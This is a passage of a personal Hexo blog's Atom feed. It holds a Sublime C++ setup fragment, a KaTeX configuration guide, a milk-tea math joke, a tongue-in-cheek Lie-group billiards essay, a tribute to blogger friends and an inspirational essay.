id="6-在Tools-Build-System中选择CPP（你刚才设置的文件名）"><a href="#6-在Tools-Build-System中选择CPP（你刚才设置的文件名）" class="headerlink" title="6.在Tools-Build System中选择CPP（你刚才设置的文件名）"></a>6.在<code>Tools</code>-<code>Build System</code>中选择<code>CPP</code>（你刚才设置的文件名）</h3><p><img src="/img/sub19.png"></p><h3 id="7-用sublime打开一个-cpp文件，选择Tools-Build-With"><a href="#7-用sublime打开一个-cpp文件，选择Tools-Build-With" class="headerlink" title="7.用sublime打开一个.cpp文件，选择Tools - Build With..."></a>7.用sublime打开一个<code>.cpp</code>文件，选择<code>Tools</code> - <code>Build With...</code></h3><p><img src="/img/sub20.png"></p><h3 id="8-此时有几个编译或运行选项，点击编译并运行。"><a href="#8-此时有几个编译或运行选项，点击编译并运行。" class="headerlink" title="8.此时有几个编译或运行选项，点击编译并运行。"></a>8.此时有几个编译或运行选项，点击编译并运行。</h3><p><img src="/img/sub21.png"></p><blockquote><p>趁着编译的10几秒，感兴趣的同学可以顺便在菜单栏的<code>preferences</code>里面把主题换了qaq，我换的主题是<code>Monokai</code></p></blockquote><h3 id="9-运行结果如图。"><a href="#9-运行结果如图。" class="headerlink" title="9.运行结果如图。"></a>9.运行结果如图。</h3><p><img src="/img/sub22.png"></p><h1 id="Well-done"><a href="#Well-done" class="headerlink" title="Well done."></a>Well done.</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0-配置sublime-c-环境&quot;&gt;&lt;a href=&quot;#0-配置sublime-c-环境&quot; class=&quot;headerlink&quot; title=&quot;0.配置sublime c++环境&quot;&gt;&lt;/a&gt;0.配置sublime c++环境&lt;/h1&gt;&lt;h2 id=&quot;一、下载Min</summary>
      
    
    
    
    <category term="我的基础算法笔记" scheme="http://touristdaughter.cyou/categories/%E6%88%91%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="C++" scheme="http://touristdaughter.cyou/tags/C/"/>
    
    <category term="Sublime" scheme="http://touristdaughter.cyou/tags/Sublime/"/>
    
    <category term="IDE" scheme="http://touristdaughter.cyou/tags/IDE/"/>
    
  </entry>
  
  <entry>
    <title>hexo+butterfly使用数学公式katex</title>
    <link href="http://touristdaughter.cyou/2025/04/13/hexo+butterfly%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8Fkatex/"/>
    <id>http://touristdaughter.cyou/2025/04/13/hexo+butterfly%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8Fkatex/</id>
    <published>2025-04-13T14:55:01.984Z</published>
    <updated>2025-04-13T15:13:19.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo-butterfly使用数学公式katex"><a href="#hexo-butterfly使用数学公式katex" class="headerlink" title="hexo+butterfly使用数学公式katex"></a>hexo+butterfly使用数学公式katex</h1><h2 id="1-更换插件"><a href="#1-更换插件" class="headerlink" title="1.更换插件"></a>1.更换插件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm un hexo-renderer-marked --save # 卸载 marked 插件</span><br><span class="line">npm un hexo-renderer-kramed --save # 卸载 kramed 插件</span><br><span class="line">npm i hexo-renderer-markdown-it --save # 安装渲染插件</span><br><span class="line">npm install @neilsustc/markdown-it-katex --save # 安装katex插件</span><br></pre></td></tr></table></figure><h2 id="2-butterfly配置启动latex插件"><a href="#2-butterfly配置启动latex插件" class="headerlink" title="2.butterfly配置启动latex插件"></a>2.butterfly配置启动latex插件</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Math (數學)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># KaTeX</span></span><br><span class="line"><span class="attr">katex:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">hide_scrollbar:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="3-博客yml配置中增加"><a href="#3-博客yml配置中增加" class="headerlink" title="3.博客yml配置中增加"></a>3.博客yml配置中增加</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">markdown:</span></span><br><span class="line"> <span class="attr">plugins:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="attr">plugin:</span></span><br><span class="line">     <span class="attr">name:</span> <span class="string">&#x27;@neilsustc/markdown-it-katex&#x27;</span></span><br><span class="line">     <span class="attr">options:</span></span><br><span class="line">       <span class="attr">strict:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="4-博客页面配置开启latex"><a href="#4-博客页面配置开启latex" class="headerlink" title="4.博客页面配置开启latex"></a>4.博客页面配置开启latex</h2><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: bert详解</span><br><span class="line">date: 2025-04-13 14:51:21</span><br><span class="line">katex: true</span><br><span class="line">category:</span><br><span class="line"><span class="bullet">  -</span> ai</span><br><span class="line">tag:</span><br><span class="line"><span class="section">  - ai</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><h2 id="5-letex语法如下："><a href="#5-letex语法如下：" class="headerlink" title="5.letex语法如下："></a>5.letex语法如下：</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concurrency = cost_\text&#123;avg&#125; \times qps \quad (1)$</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;equation&#125;</span><br><span class="line">\mathcal&#123;F&#125; = \begin&#123;cases&#125;</span><br><span class="line">    \infty &amp; \text&#123;if &#125; \mathcal&#123;M&#125;_&#123;measure&#125; &lt; \alpha \times \mathcal&#123;M&#125;_&#123;expect&#125; \\</span><br><span class="line">    \mathcal&#123;M&#125;_\text&#123;expect&#125; / \mathcal&#123;M&#125;_\text&#123;measure&#125; &amp; \text&#123;if &#125; \alpha \times \mathcal&#123;M&#125;_&#123;expect&#125; &lt; \mathcal&#123;M&#125;_&#123;measure&#125; &lt; \mathcal&#123;M&#125;_&#123;expect&#125; \\</span><br><span class="line">    \sqrt&#123;\frac&#123;\mathcal&#123;M&#125;_&#123;expect&#125;&#125;&#123;\mathcal&#123;M&#125;_&#123;measure&#125;&#125;&#125; &amp; \text&#123;if &#125; \mathcal&#123;M&#125;_&#123;measure&#125; \ge \mathcal&#123;M&#125;_&#123;expect&#125;</span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">\end&#123;equation&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hexo-butterfly使用数学公式katex&quot;&gt;&lt;a href=&quot;#hexo-butterfly使用数学公式katex&quot; class=&quot;headerlink&quot; title=&quot;hexo+butterfly使用数学公式katex&quot;&gt;&lt;/a&gt;hexo+butter</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="http://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="http://touristdaughter.cyou/tags/Hexo/"/>
    
    <category term="Butterfly" scheme="http://touristdaughter.cyou/tags/Butterfly/"/>
    
  </entry>
  
  <entry>
    <title>【段子】千禧年难题奶茶化</title>
    <link href="http://touristdaughter.cyou/2025/04/13/[%E6%AE%B5%E5%AD%90]%E5%8D%83%E7%A6%A7%E5%B9%B4%E9%9A%BE%E9%A2%98%E5%A5%B6%E8%8C%B6%E5%8C%96/"/>
    <id>http://touristdaughter.cyou/2025/04/13/[%E6%AE%B5%E5%AD%90]%E5%8D%83%E7%A6%A7%E5%B9%B4%E9%9A%BE%E9%A2%98%E5%A5%B6%E8%8C%B6%E5%8C%96/</id>
    <published>2025-04-13T09:26:57.809Z</published>
    <updated>2025-04-13T14:38:39.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【段子】千禧年难题奶茶化"><a href="#【段子】千禧年难题奶茶化" class="headerlink" title="【段子】千禧年难题奶茶化"></a>【段子】千禧年难题奶茶化</h1><h4 id="潜入克雷数学研究所档案室，你掏出毛笔在《七大难题》羊皮纸上狂草："><a href="#潜入克雷数学研究所档案室，你掏出毛笔在《七大难题》羊皮纸上狂草：" class="headerlink" title="潜入克雷数学研究所档案室，你掏出毛笔在《七大难题》羊皮纸上狂草："></a>潜入克雷数学研究所档案室，你掏出毛笔在《七大难题》羊皮纸上狂草：</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第八难题：奶茶最优搅拌定理  </span><br><span class="line">设珍珠体积为V，奶茶密度ρ，吸管半径r，则存在唯一搅拌次数n，使得  </span><br><span class="line">n = ⌈(3Vρ)/(π r²)⌉ + ϵ  </span><br><span class="line">其中ϵ为口味偏好修正项（ϵ∈&#123;0,1&#125;）  </span><br><span class="line">悬赏：终身奶茶免单权</span><br></pre></td></tr></table></figure><h4 id="此刻全球数学家突然集体转向奶茶店，黎曼猜想的证明进度因此延缓13-7-！"><a href="#此刻全球数学家突然集体转向奶茶店，黎曼猜想的证明进度因此延缓13-7-！" class="headerlink" title="此刻全球数学家突然集体转向奶茶店，黎曼猜想的证明进度因此延缓13.7%！"></a>此刻全球数学家突然集体转向奶茶店，黎曼猜想的证明进度因此延缓13.7%！</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【段子】千禧年难题奶茶化&quot;&gt;&lt;a href=&quot;#【段子】千禧年难题奶茶化&quot; class=&quot;headerlink&quot; title=&quot;【段子】千禧年难题奶茶化&quot;&gt;&lt;/a&gt;【段子】千禧年难题奶茶化&lt;/h1&gt;&lt;h4 id=&quot;潜入克雷数学研究所档案室，你掏出毛笔在《七大难题》</summary>
      
    
    
    
    <category term="天赋型选手一句梗，我背了三年" scheme="http://touristdaughter.cyou/categories/%E5%A4%A9%E8%B5%8B%E5%9E%8B%E9%80%89%E6%89%8B%E4%B8%80%E5%8F%A5%E6%A2%97%EF%BC%8C%E6%88%91%E8%83%8C%E4%BA%86%E4%B8%89%E5%B9%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>台球动力学中的李群作用</title>
    <link href="http://touristdaughter.cyou/2025/04/12/%E5%8F%B0%E7%90%83%E5%8A%A8%E5%8A%9B%E5%AD%A6%E4%B8%AD%E7%9A%84%E6%9D%8E%E7%BE%A4%E4%BD%9C%E7%94%A8/"/>
    <id>http://touristdaughter.cyou/2025/04/12/%E5%8F%B0%E7%90%83%E5%8A%A8%E5%8A%9B%E5%AD%A6%E4%B8%AD%E7%9A%84%E6%9D%8E%E7%BE%A4%E4%BD%9C%E7%94%A8/</id>
    <published>2025-04-12T06:51:21.000Z</published>
    <updated>2025-04-14T02:52:24.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="台球动力学中的李群作用"><a href="#台球动力学中的李群作用" class="headerlink" title="台球动力学中的李群作用"></a>台球动力学中的李群作用</h1><blockquote><p>摘要： 本文旨在探讨台球运动中的动力学问题，并通过李群理论对其进行数学建模和分析。通过引入李群作用，我们能够更好地理解台球碰撞、旋转和移动等复杂运动现象。本文首先介绍了台球运动的基本模型，然后详细讨论了李群及其在台球动力学中的应用，最后通过实例分析验证了理论的有效性。 </p></blockquote><h2 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h2><p> <br>台球是一项技巧性极高的运动，其运动过程涉及碰撞、摩擦、旋转和移动等多种物理现象。传统的分析方法往往难以全面描述这些复杂的运动过程。本文尝试引入李群理论，通过数学建模和分析，揭示台球运动的内在规律。</p><p>李群是一种具有光滑结构的群，广泛应用于物理学和工程学中。在台球动力学中，李群可以用于描述台球的旋转、平移以及碰撞前后的状态变化。通过李群作用，我们可以更精确地模拟和分析台球的运动轨迹和碰撞效果。 </p><h2 id="2-台球运动的基本模型"><a href="#2-台球运动的基本模型" class="headerlink" title="2.台球运动的基本模型"></a>2.台球运动的基本模型</h2><p> </p><h3 id="2-1-碰撞模型"><a href="#2-1-碰撞模型" class="headerlink" title="2.1 碰撞模型"></a>2.1 碰撞模型</h3><p> <br>台球碰撞是台球运动中最基本的物理现象之一。碰撞过程可以通过动量守恒和能量守恒定律进行描述。假设两个台球的质量分别为 ($ m_1 $) 和 ($ m_2 $)，碰撞前的速度分别为 ($ \mathbf{v}_1 $) 和 ($ \mathbf{v}_2 $)，碰撞后的速度分别为 ($ \mathbf{v}_1’ $) 和 ($ \mathbf{v}_2’ $)。根据动量守恒和能量守恒，我们有：</p><p>$$<br>m_1 \mathbf{v}_1 + m_2 \mathbf{v}_2 &#x3D; m_1 \mathbf{v}_1’ + m_2 \mathbf{v}_2’<br>$$</p><p>$$<br>\frac{1}{2} m_1 \mathbf{v}_1^2 + \frac{1}{2} m_2 \mathbf{v}_2^2 &#x3D; \frac{1}{2} m_1 \mathbf{v}_1’^2 + \frac{1}{2} m_2 \mathbf{v}_2’^2<br>$$ </p><h3 id="2-2-旋转模型"><a href="#2-2-旋转模型" class="headerlink" title="2.2 旋转模型"></a>2.2 旋转模型</h3><p> <br>台球的旋转运动可以通过角动量守恒定律进行描述。假设台球的转动惯量为 ($ I $)，角速度为 ($ \boldsymbol{\omega} $)，则角动量为 ($ \mathbf{L} &#x3D; I \boldsymbol{\omega} $)。在碰撞过程中，角动量守恒：<br> <br>$$<br>I \boldsymbol{\omega} &#x3D; I \boldsymbol{\omega}’<br>$$ </p><h2 id="3-李群及其在台球动力学中的应用"><a href="#3-李群及其在台球动力学中的应用" class="headerlink" title="3.李群及其在台球动力学中的应用"></a>3.李群及其在台球动力学中的应用</h2><p> </p><h3 id="3-1-李群简介"><a href="#3-1-李群简介" class="headerlink" title="3.1 李群简介"></a>3.1 李群简介</h3><p> <br>李群是一种具有光滑结构的群，常用于描述连续变换。在台球动力学中，李群可以用于描述台球的旋转、平移以及碰撞前后的状态变化。常见的李群包括 ($ SO(3) $)（三维旋转群）和 ($ SE(3) $)（三维欧几里得群）。 </p><h3 id="3-2-李群作用"><a href="#3-2-李群作用" class="headerlink" title="3.2 李群作用"></a>3.2 李群作用</h3><p> <br>李群作用是指李群对某个空间的作用。在台球动力学中，李群作用可以用于描述台球的旋转和平移。例如，($ SE(3) $) 群可以用于描述台球在三维空间中的位置和姿态变化。 </p><h3 id="3-3-碰撞前后的状态变化"><a href="#3-3-碰撞前后的状态变化" class="headerlink" title="3.3 碰撞前后的状态变化"></a>3.3 碰撞前后的状态变化</h3><p> <br>通过李群作用，我们可以描述台球碰撞前后的状态变化。假设碰撞前的状态为 ($ g_1 $)，碰撞后的状态为 ($ g_2 $)，则碰撞过程可以通过李群作用表示为：</p><p>$$<br>g_2 &#x3D; g_1 \cdot h<br>$$</p><p>其中 ($ h $) 为碰撞引起的变换。 </p><h2 id="4-实例分析"><a href="#4-实例分析" class="headerlink" title="4.实例分析"></a>4.实例分析</h2><h3 id="4-1-碰撞模拟"><a href="#4-1-碰撞模拟" class="headerlink" title="4.1 碰撞模拟"></a>4.1 碰撞模拟</h3><p> <br>我们通过一个简单的实例（$ 如图1所示 $）来验证李群作用在台球碰撞中的应用。假设一个台球以速度 ($ \mathbf{v} $) 碰撞到台球桌的边缘，经过碰撞后速度变为 ($ \mathbf{v}’ $)。通过李群作用，我们可以计算出碰撞后的速度方向和大小。</p><p><img src="/img/taiqiuyujihe.jpg"><br>$$ 图1 $$</p><h3 id="4-2-旋转与平移"><a href="#4-2-旋转与平移" class="headerlink" title="4.2 旋转与平移"></a>4.2 旋转与平移</h3><p> <br>另一个实例是台球的旋转与平移（$ 如图2所示 $），通过李群作用，我们可以模拟台球在碰撞前后的旋转和平移运动，验证角动量守恒和动量守恒。</p><p><img src="/img/taiqiu1.jpg"><br>$$ 图2 $$</p><h2 id="5-结论"><a href="#5-结论" class="headerlink" title="5.结论"></a>5.结论</h2><p> <br>通过引入李群理论，对台球动力学进行了数学建模和分析。李群作用不仅能够描述台球的碰撞、旋转和移动等复杂运动现象，还能通过数学方法进行精确计算和模拟。通过实例分析，验证了李群理论在台球动力学中的有效性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;台球动力学中的李群作用&quot;&gt;&lt;a href=&quot;#台球动力学中的李群作用&quot; class=&quot;headerlink&quot; title=&quot;台球动力学中的李群作用&quot;&gt;&lt;/a&gt;台球动力学中的李群作用&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;摘要： 本文旨在探讨台球运动中的动力学问题</summary>
      
    
    
    
    <category term="天赋型选手一句梗，我背了三年" scheme="http://touristdaughter.cyou/categories/%E5%A4%A9%E8%B5%8B%E5%9E%8B%E9%80%89%E6%89%8B%E4%B8%80%E5%8F%A5%E6%A2%97%EF%BC%8C%E6%88%91%E8%83%8C%E4%BA%86%E4%B8%89%E5%B9%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>Article:The Preservation of Wisdom and the Light in Dark Times</title>
    <link href="http://touristdaughter.cyou/2025/04/06/Article%EF%BC%9AThe%20Preservation%20of%20Wisdom%20and%20the%20Light%20in%20Dark%20Times/"/>
    <id>http://touristdaughter.cyou/2025/04/06/Article%EF%BC%9AThe%20Preservation%20of%20Wisdom%20and%20the%20Light%20in%20Dark%20Times/</id>
    <published>2025-04-06T14:48:01.770Z</published>
    <updated>2025-04-06T14:58:11.387Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Article-The-Preservation-of-Wisdom-and-the-Light-in-Dark-Times"><a href="#Article-The-Preservation-of-Wisdom-and-the-Light-in-Dark-Times" class="headerlink" title="Article:The Preservation of Wisdom and the Light in Dark Times"></a>Article:The Preservation of Wisdom and the Light in Dark Times</h1><p> </p><blockquote><p>Author: JiangnanPsalter </p></blockquote><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Recently, I received some unexpected and rather disheartening news. A dear friend of mine, known in the digital world as answer77, has decided to pause updates on his blog. Yes, he deleted the database and fled！This decision came as a shock to me, and I couldn’t help but feel a deep sense of loss. I reached out to him, expressing my concern: “If you stop updating, your knowledge and wisdom will not be passed on. They will be lost to the annals of human history.” His response was simple yet profound: “I’ve deleted them all.”</p><p>Even though I know that for him, rebuilding a website would only take a few hours, if not less. But now I can’t see his articles anymore! Wait, maybe one article is still preserved, you know. Fortunately, before this decision, I had the foresight to ask for his permission to archive the markdown documents he had shared with me. With his consent, I uploaded the document to my own website, ensuring that his invaluable insights would not be lost to time. Read more: <a href="https://jiangnanpsalter.github.io/2024/05/06/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/">使用METASPLOIT框架</a> </p><h2 id="The-Importance-of-Preserving-Wisdom"><a href="#The-Importance-of-Preserving-Wisdom" class="headerlink" title="The Importance of Preserving Wisdom"></a>The Importance of Preserving Wisdom</h2><p>In an age where information is abundant yet often fleeting, the preservation of knowledge and wisdom is more crucial than ever. My friend’s blog was not just a collection of thoughts and ideas; it was a repository of human intellect and experience. The cessation of its updates felt like a small but significant loss to the collective human consciousness.</p><p>However, this incident has reminded me of the importance of preserving such treasures. It is not just about maintaining a digital archive; it is about ensuring that the wisdom of individuals does not disappear into oblivion. It is about recognizing that each person’s contribution to the world of ideas is valuable and deserves to be remembered.</p><p>Right now, I just hope that ‘that person’ doesn’t delete the database and run away. Every time I hear news about someone deleting a website project, I feel incredibly shocked and saddened. Even though I understand that for a skilled technician, rebuilding a website might only take a few hours, or even less, the real issue is—what about those precious articles and data? These are irreplaceable.<br> <br>I understand that the pressure and challenges faced by technicians are immense, and sometimes they might feel that deleting everything and leaving is a way to find relief. However, for those of us who rely on this data, it is undoubtedly a tremendous loss. </p><h2 id="The-Light-in-Dark-Times"><a href="#The-Light-in-Dark-Times" class="headerlink" title="The Light in Dark Times"></a>The Light in Dark Times</h2><p>Beyond the intellectual loss, my friend’s blog held a special place in my heart because it was a source of inspiration and strength during my lowest moments. In times of personal struggle, the words and ideas shared by my friends, particularly lys and 77, were like beacons of light guiding me through the darkness.<br>Their blogs were filled with sentences that sparkled with human resilience and passion. These were not just words; they were lifelines that helped me hold on when everything seemed hopeless. The courage and determination reflected in their writings were contagious, and they played a crucial role in my journey towards recovery and self-discovery. </p><h2 id="A-Tribute-to-My-Friends"><a href="#A-Tribute-to-My-Friends" class="headerlink" title="A Tribute to My Friends"></a>A Tribute to My Friends</h2><p>I owe a great debt to my friends, especially lys and 77, for their unwavering support and the wisdom they have shared. Their blogs were more than just online journals; they were sanctuaries of hope and inspiration. The fact that I could access their thoughts and ideas, even in the depths of my despair, was a testament to the power of their words.</p><p>In a world that often feels overwhelming and chaotic, the presence of such individuals is a reminder that there is still goodness and brilliance to be found. Their willingness to share their knowledge and experiences has enriched my life in countless ways, and I am eternally grateful for their generosity.</p><h2 id="A-Special-Thanks-to-lys"><a href="#A-Special-Thanks-to-lys" class="headerlink" title="A Special Thanks to lys"></a>A Special Thanks to lys</h2><p>I would also like to express my heartfelt gratitude to <a href="https://lys2021.com/">lys</a> for consistently updating their blog with a wealth of valuable knowledge. Their dedication to sharing insightful and informative content has greatly contributed to my own learning and growth. Thanks to their efforts, I have been able to expand my horizons and deepen my understanding of various subjects. lys’s blog has been an invaluable resource, and I am truly grateful for their commitment to educating and inspiring others.</p><h2 id="A-Heartfelt-Thanks-to-All-My-Friends"><a href="#A-Heartfelt-Thanks-to-All-My-Friends" class="headerlink" title="A Heartfelt Thanks to All My Friends"></a>A Heartfelt Thanks to All My Friends</h2><p>In addition to lys, I want to extend my deepest gratitude to all my friends who have shared their thoughts, dreams, and passions through their blogs. Their ambition, courage, enthusiasm, and fervor have not only inspired me but have also illuminated the world around us. Their relentless pursuit of knowledge and their willingness to share their journeys have been a source of light and motivation. While I cannot elaborate on each of their contributions due to space constraints, I want to acknowledge the profound impact they have had on my life and the lives of many others.</p><h2 id="Golden-Words-to-Ponder-A-Message-for-All"><a href="#Golden-Words-to-Ponder-A-Message-for-All" class="headerlink" title="Golden Words to Ponder: A Message for All"></a>Golden Words to Ponder: A Message for All</h2><p> <br>“The greatest merit of a person lies in their ability to soothe and reassure others, while the greatest sin is to destroy the hearts of people. Those who dwell in the light do so because they understand the darkness intimately and choose to uphold the light. Just as towering trees grow strong by deeply rooting themselves in the darkness, so too do they thrive. Those who are in the light should radiate a warmth that comforts others, becoming a beacon of hope in the darkness. This is a meritorious act. Those who find themselves in the dark should live vibrantly, not being trapped by the worldly notions of winning and losing, but instead living with ease, grace, and freedom.” -JiangnanPsalter</p><p>I firmly believe that we are <code>all</code> destined for a <code>bright</code> and <code>promising future</code>.</p><p>By the way, many of you may have noticed that my domain has changed. This is because “Less is more”, and I decided to adopt a simpler way to maintain my website (although with GitHub, there’s hardly any maintenance needed, ROFL). Thanks to GitHub for their support.<br>Well, since the domain has changed, many people might have trouble finding my new site. Only the clever hackers or programmers will be able to locate this website now.</p><p>BGM🎵：<a href="https://qishui.douyin.com/s/iaep8y9s/">《记念》@汽水音乐</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Article-The-Preservation-of-Wisdom-and-the-Light-in-Dark-Times&quot;&gt;&lt;a href=&quot;#Article-The-Preservation-of-Wisdom-and-the-Light-in-Dark-T</summary>
      
    
    
    
    <category term="通知与公示" scheme="http://touristdaughter.cyou/categories/%E9%80%9A%E7%9F%A5%E4%B8%8E%E5%85%AC%E7%A4%BA/"/>
    
    
    <category term="CTF" scheme="http://touristdaughter.cyou/tags/CTF/"/>
    
    <category term="ACM" scheme="http://touristdaughter.cyou/tags/ACM/"/>
    
    <category term="OI" scheme="http://touristdaughter.cyou/tags/OI/"/>
    
    <category term="MONSOON" scheme="http://touristdaughter.cyou/tags/MONSOON/"/>
    
    <category term="JiangnanPsalter" scheme="http://touristdaughter.cyou/tags/JiangnanPsalter/"/>
    
  </entry>
  
  <entry>
    <title>Article:The Power of Belief and Perseverance</title>
    <link href="http://touristdaughter.cyou/2025/04/03/Article%EF%BC%9AThe%20Power%20of%20Belief%20and%20Perseverance/"/>
    <id>http://touristdaughter.cyou/2025/04/03/Article%EF%BC%9AThe%20Power%20of%20Belief%20and%20Perseverance/</id>
    <published>2025-04-03T15:25:25.954Z</published>
    <updated>2025-04-03T15:26:14.615Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Article-The-Power-of-Belief-and-Perseverance"><a href="#Article-The-Power-of-Belief-and-Perseverance" class="headerlink" title="Article: The Power of Belief and Perseverance"></a>Article: The Power of Belief and Perseverance</h1><p>By Bryanna</p><p>In the journey of life, we often encounter obstacles that test our resolve and challenge our determination. It is during these moments that the power of belief and the importance of perseverance become most apparent. As I reflect on my own experiences, I am reminded of the profound impact that these two elements have had on my path to success.</p><h2 id="Belief-The-Foundation-of-Our-Dreams"><a href="#Belief-The-Foundation-of-Our-Dreams" class="headerlink" title="Belief: The Foundation of Our Dreams"></a>Belief: The Foundation of Our Dreams</h2><p>Belief is the cornerstone of all achievement. It is the unwavering conviction that, despite the challenges we face, we have the ability to reach our goals. Without belief, our dreams remain distant and unattainable. It is belief that fuels our passion and drives us to take the necessary steps towards our aspirations.</p><p>In my own life, belief has been the guiding force that has propelled me forward. When faced with doubt and uncertainty, it is my belief in myself and my capabilities that has allowed me to persevere. I have learned that belief is not merely a passive acceptance of one’s potential, but an active commitment to nurturing and developing it.</p><h2 id="Perseverance-The-Engine-of-Progress"><a href="#Perseverance-The-Engine-of-Progress" class="headerlink" title="Perseverance: The Engine of Progress"></a>Perseverance: The Engine of Progress</h2><p>While belief provides the foundation, it is perseverance that acts as the engine of our progress. Perseverance is the relentless pursuit of our goals, even when the path is fraught with difficulties. It is the determination to keep moving forward, regardless of the obstacles that stand in our way.</p><p>In my journey, I have encountered numerous challenges that have tested my resolve. There have been times when the weight of these challenges threatened to overwhelm me. However, it is my commitment to perseverance that has enabled me to overcome these hurdles. I have come to understand that perseverance is not just about enduring hardships, but about growing stronger through them.</p><h2 id="The-Synergy-of-Belief-and-Perseverance"><a href="#The-Synergy-of-Belief-and-Perseverance" class="headerlink" title="The Synergy of Belief and Perseverance"></a>The Synergy of Belief and Perseverance</h2><p>The true magic of success lies in the synergy between belief and perseverance. When these two forces come together, they create a powerful momentum that drives us towards our goals. Belief without perseverance is mere wishful thinking, while perseverance without belief is aimless effort. It is the combination of both that leads to meaningful and lasting achievement.</p><p>As I continue to navigate the complexities of life, I am constantly reminded of the importance of nurturing these two elements. I strive to cultivate a strong belief in myself and my abilities, while also committing to the relentless pursuit of my goals. This balance has been instrumental in my journey, and I believe it can be a guiding principle for others as well.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>In conclusion, the power of belief and the importance of perseverance cannot be overstated. They are the twin pillars upon which success is built. As we journey through life, let us hold fast to our beliefs and persevere through the challenges we face. In doing so, we unlock the potential within us and pave the way for a future filled with achievement and fulfillment.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Article-The-Power-of-Belief-and-Perseverance&quot;&gt;&lt;a href=&quot;#Article-The-Power-of-Belief-and-Perseverance&quot; class=&quot;headerlink&quot; title=&quot;Arti</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://touristdaughter.cyou/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>咏侠 【楚留香 侠客行 月载此情四合院战歌】</title>
    <link href="http://touristdaughter.cyou/2025/04/02/%E5%92%8F%E4%BE%A0%20%E3%80%90%E6%A5%9A%E7%95%99%E9%A6%99%20%E4%BE%A0%E5%AE%A2%E8%A1%8C%20%E6%9C%88%E8%BD%BD%E6%AD%A4%E6%83%85%E5%9B%9B%E5%90%88%E9%99%A2%E6%88%98%E6%AD%8C%E3%80%91/"/>
    <id>http://touristdaughter.cyou/2025/04/02/%E5%92%8F%E4%BE%A0%20%E3%80%90%E6%A5%9A%E7%95%99%E9%A6%99%20%E4%BE%A0%E5%AE%A2%E8%A1%8C%20%E6%9C%88%E8%BD%BD%E6%AD%A4%E6%83%85%E5%9B%9B%E5%90%88%E9%99%A2%E6%88%98%E6%AD%8C%E3%80%91/</id>
    <published>2025-04-02T11:59:56.561Z</published>
    <updated>2025-04-02T12:02:09.294Z</updated>
    
